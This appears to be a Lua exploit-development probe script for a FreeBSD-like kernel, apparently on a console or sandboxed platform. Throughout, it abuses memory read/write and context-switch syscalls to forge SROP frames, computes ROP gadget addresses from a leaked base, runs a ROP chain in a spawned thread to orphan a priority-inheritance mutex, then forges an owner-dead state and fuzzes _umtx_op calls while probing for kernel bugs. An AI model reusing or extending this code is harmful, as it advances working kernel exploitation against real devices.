-- CRASH_CLASS: MODERATE
-- PROBE 146d: Orphaned PI mutex — simple version

print("=== PROBE 146d: ORPHAN PI ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- [A] Thread A: lock PI mutex, write marker, thr_exit
print("--- [A] ORPHAN ---")

local mtx = gpu + 0x1000
local mtx_addr = uint64(string.format("0x%X%08X", gh, gl + 0x1000))
wd(mtx, 0)
wd(mtx + 4, 4) -- PI
for off = 8, 47, 4 do wd(mtx + off, 0) end

local doneA = gpu + 0x2000
wq(doneA, uint64(0))
local doneA_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000))

local ts_s = gpu + 0x3000
wq(ts_s, uint64(0))
wq(ts_s + 8, uint64(50000000))
local ts_s_a = uint64(string.format("0x%X%08X", gh, gl + 0x3000))

local rop = gpu + 0x10000
local rop_a = uint64(string.format("0x%X%08X", gh, gl + 0x10000))
local i = 0

-- nanosleep 50ms
wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, ts_s_a); i=i+8
wq(rop+i, g_pop_rsi); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64(240)); i=i+8
wq(rop+i, sc_addr); i=i+8

-- _umtx_op(mtx, 5=MUTEX_LOCK, 0, 0, 0)
wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, mtx_addr); i=i+8
wq(rop+i, g_pop_rsi); i=i+8
wq(rop+i, uint64(5)); i=i+8
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64(454)); i=i+8
wq(rop+i, sc_addr); i=i+8

-- Write done marker
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64("0x00000000AAAA0001")); i=i+8
wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, doneA_a); i=i+8
wq(rop+i, g_wr); i=i+8

-- thr_exit(0)
wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, g_pop_rsi); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64(431)); i=i+8
wq(rop+i, sc_addr); i=i+8

-- Thread context
local tctx = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
pcall(function() return sc_gc(uint64(tctx)) end)
wq(tctx + 0xE0, g_ret)
wq(tctx + 0xF8, rop_a)
wq(tctx + MC + 0x18, uint64(0))
wq(tctx + MC + 0x50, uint64(0))
wq(tctx + MC + 0x28, uint64(0))
wq(tctx + MC + 0x30, uint64(0))

local tbuf = gpu + 0x30000
wq(tbuf, uint64(0))

print("launch thrA")
local ok_t, rv_t = pcall(function()
    return sc_thr(uint64(tctx), uint64(tbuf), uint64(0))
end)
print("thrA=" .. tostring(rv_t))

-- Wait 300ms
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local daA = memory.read_qword(doneA)
local _, dalA = get_hi_lo(daA)
print("doneA=0x" .. string.format("%08X", dalA))

local owner = to_num(memory.read_dword(mtx))
print("owner=0x" .. string.format("%08X", owner))

-- [B] Try to lock the orphan via SROP TRYLOCK
print("")
print("--- [B] TRYLOCK ORPHAN ---")
local try_rv = srop(454, uint64(mtx_addr), uint64(4), uint64(0), uint64(0), uint64(0))
print("trylock=" .. (try_rv and tostring(to_num(try_rv)) or "nil"))
local owner2 = to_num(memory.read_dword(mtx))
print("owner2=0x" .. string.format("%08X", owner2))

-- [C] Set OWNER_DEAD and try lock
print("")
print("--- [C] OWNER_DEAD ---")
-- Set UMUTEX_OWNER_DEAD (0x40000000) | old owner TID
if owner > 0 and owner < 0x40000000 then
    wd(mtx, owner + 0x40000000)
    print("set dead=0x" .. string.format("%08X", to_num(memory.read_dword(mtx))))

    local lock_dead = srop(454, uint64(mtx_addr), uint64(5), uint64(0), uint64(0), uint64(0))
    local ldr = lock_dead and to_num(lock_dead) or -999
    print("lock_dead=" .. ldr)
    local owner3 = to_num(memory.read_dword(mtx))
    print("owner3=0x" .. string.format("%08X", owner3))

    if ldr == 0 then
        print("*** ACQUIRED DEAD MUTEX ***")
        srop(454, uint64(mtx_addr), uint64(6), uint64(0), uint64(0), uint64(0))
    end
end

-- [D] Non-blocking UMTX ops
print("")
print("--- [D] OPS ---")
local tb = gpu + 0x4000
for off = 0, 63, 4 do wd(tb + off, 0) end
local tb_a = uint64(string.format("0x%X%08X", gh, gl + 0x4000))

-- op 3 WAKE
local r3 = srop(454, uint64(tb_a), uint64(3), uint64(1), uint64(0), uint64(0))
print("WAKE=" .. (r3 and tostring(to_num(r3)) or "nil"))

-- op 4 TRYLOCK
local r4 = srop(454, uint64(tb_a), uint64(4), uint64(0), uint64(0), uint64(0))
print("TRYLOCK=" .. (r4 and tostring(to_num(r4)) or "nil"))
if r4 and to_num(r4) == 0 then
    srop(454, uint64(tb_a), uint64(6), uint64(0), uint64(0), uint64(0))
end

-- op 9 CV_SIGNAL
local r9 = srop(454, uint64(tb_a), uint64(9), uint64(0), uint64(0), uint64(0))
print("CV_SIG=" .. (r9 and tostring(to_num(r9)) or "nil"))

-- op 10 CV_BROADCAST
local r10 = srop(454, uint64(tb_a), uint64(10), uint64(0), uint64(0), uint64(0))
print("CV_BCAST=" .. (r10 and tostring(to_num(r10)) or "nil"))

-- op 16 WAKE_PRIVATE
local r16 = srop(454, uint64(tb_a), uint64(16), uint64(1), uint64(0), uint64(0))
print("WAKE_PRIV=" .. (r16 and tostring(to_num(r16)) or "nil"))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
